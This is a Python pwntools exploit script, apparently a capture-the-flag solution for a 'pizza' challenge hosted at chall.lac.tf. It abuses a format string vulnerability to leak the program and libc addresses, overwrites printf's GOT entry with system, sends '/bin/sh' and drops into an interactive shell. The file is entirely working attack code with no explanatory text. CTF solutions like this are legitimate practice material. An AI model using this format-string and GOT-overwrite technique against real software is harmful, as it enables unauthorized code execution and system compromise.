#!/usr/bin/env python3

from pwn import *

e = ELF("./pizza_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = e

if args.REMOTE:
    r = remote("chall.lac.tf", 31134)
else:
    r = process([e.path])
    if args.GDB:
        gdb.attach(r)

r.sendlineafter(b'> ', b'12')
r.sendlineafter(b'topping: ', b'%49$p %47$p')
r.sendlineafter(b'> ', b'0')
r.sendlineafter(b'> ', b'0')
r.recvuntil(b'chose:\n')

e.address = int(r.recvuntil(b' ')[:-1], 0) - 0x1189 #int(r.recvuntil(b' ', drop=True), 0) - 0x1189
log.info(f'{hex(e.address)=}')
libc.address = int(r.recvline()[:-1], 0) - ((libc.symbols['__libc_start_main'])+133 - 0xbb) #int(r.recvline(keepends=False), 0) - 0x2724a
log.info(f'{hex(libc.address)=}')
r.sendlineafter(b'(y/n): ', b'y')

pl = fmtstr_payload(6, {e.got.printf: libc.symbols.system}, write_size='short')
assert len(pl) < 100
r.sendlineafter(b'> ', b'12')
r.sendlineafter(b'topping: ', pl)
r.sendlineafter(b'> ', b'12')
r.sendlineafter(b'topping: ', b'/bin/sh')
r.sendlineafter(b'> ', b'0')

r.interactive()
